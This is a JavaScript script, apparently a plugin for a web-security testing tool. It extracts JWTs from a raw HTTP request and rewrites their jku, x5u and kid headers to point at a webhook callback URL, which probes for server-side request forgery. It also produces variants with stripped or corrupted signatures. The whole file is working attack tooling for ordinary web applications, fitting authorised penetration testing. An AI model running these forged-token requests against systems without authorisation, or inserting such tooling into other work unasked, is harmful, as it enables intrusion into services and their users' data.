// Change me to an URL that you control
WEBHOOK_URL="http://webhook.site/your-uuid";

/**
 * Extracts JWT tokens from a raw HTTP request string.
 * @param {string} rawRequest - The raw HTTP request string
 * @returns {Array} Array of objects containing header name and JWT token
 */
function extractJWTs(rawRequest) {
    const jwts = [];
    
    // Split request into lines
    const lines = rawRequest.split('\n');
    
    // Headers start from the second line until an empty line (end of headers)
    let headersEndIndex = lines.findIndex(line => line.trim() === '');
    const headerLines = lines.slice(1, headersEndIndex);
  
    // Parse each header line
    for (const line of headerLines) {
      const [headerName, ...headerValueParts] = line.split(':');
      const headerValue = headerValueParts.join(':').trim();

      // Find JWT pattern in header values
      const matches = headerValue.match(/(eyJ[a-zA-Z0-9_-]+)\.(eyJ[a-zA-Z0-9_-]+)\.([a-zA-Z0-9_-]*)/g);
      if (matches) {
        matches.forEach(token => jwts.push({ headerName: headerName.trim(), headerValue: headerValue, token }));
      }
    }
  
    return jwts;
  }

/**
 * Parses a JWT into its header, payload, and signature components
 * @param {string} jwt - The JWT token
 * @returns {Object} Parsed JWT components
 */
function parseJWT(jwt) {
    const [header, payload, signature] = jwt.split('.');
    return {
      header: JSON.parse(Buffer.from(header, 'base64').toString()),
      payload: JSON.parse(Buffer.from(payload, 'base64').toString()),
      signature,
    };
  }

/**
 * Generates a JWT string from header, payload, and signature
 * @param {Object} header - JWT header object
 * @param {Object} payload - JWT payload object
 * @param {string} signature - JWT signature
 * @param {boolean} [stripeq=true] - Flag to remove padding from the JWT
 * @returns {string} New JWT string
 */
function generateJWT(header, payload, signature = '', stripeq=true) {
    const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64');
    const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
    let jwt =`${encodedHeader}.${encodedPayload}.${signature}`;
    if(stripeq){return jwt.replaceAll("=", "");} 
    else {return jwt;}
    
  }

/**
 * Creates variants of a given JWT token
 * @param {string} jwt - The original JWT token
 * @returns {Array} An array of JWT variants
 */
function createVariants(jwt) {
  const variants = [];
  variants.push(jwt);
  let parts = jwt.split(".");
  variants.push(parts[0] + "." + parts[1] + ".");
  variants.push(parts[0] + "." + parts[1]);
  variants.push(parts[0] + "." + parts[1] + "." + parts[2] + "a");

  return variants;
}

/**
 * Tests JWT for SSRF vulnerabilities by modifying specific header properties
 * @param {Object} parsedJWT - Parsed JWT components
 * @param {string} originalJWT - Original JWT token
 * @param {string} input - Original HTTP request string with JWT
 * @param {string} uuid - Unique identifier for SSRF tracking
 * @param {boolean} [variances=true] - Flag to include variants of the modified JWT
 * @returns {Array} Array of modified request strings with updated JWTs
 */
function testSSRF(parsedJWT, originalJWT, input, variances=true) {
    const ssrfProps = ["jku", "x5u", "kid"];
    const results = [];

    for (const prop of ssrfProps) {
      // Add SSRF URL to the header property
      
      const modifiedHeader = { ...parsedJWT.header, [prop]: `${WEBHOOK_URL}?type=jwtssrftest&key=${prop}` };

      const newJWT = generateJWT(modifiedHeader, parsedJWT.payload, parsedJWT.signature);
  
      if(variances){
        const vars=createVariants(newJWT);
        const reqs=vars.map(v => {
          return input.replace(originalJWT, v);
        });

        results.push(...reqs);
      }
      else{
        results.push(input.replace(originalJWT, newJWT));
      }
    }
  
    return results;
  }


/**
 * Processes the input to extract JWTs, parse the first JWT, and test for SSRF vulnerabilities.
 *
 * @param {string} input - The input string containing request headers.
 * @returns {Object} The results of the SSRF tests.
 */
function run(input) {
    const jwts = extractJWTs(input);
    if (jwts.length === 0) {
      console.log("No JWT found in request headers.");
      return;
    }
    
    const originalJWT = jwts[0].token;
    const parsedJWT = parseJWT(originalJWT);

    const ssrfResults = testSSRF(parsedJWT,originalJWT, input);

    return ssrfResults;
  }

return run(input);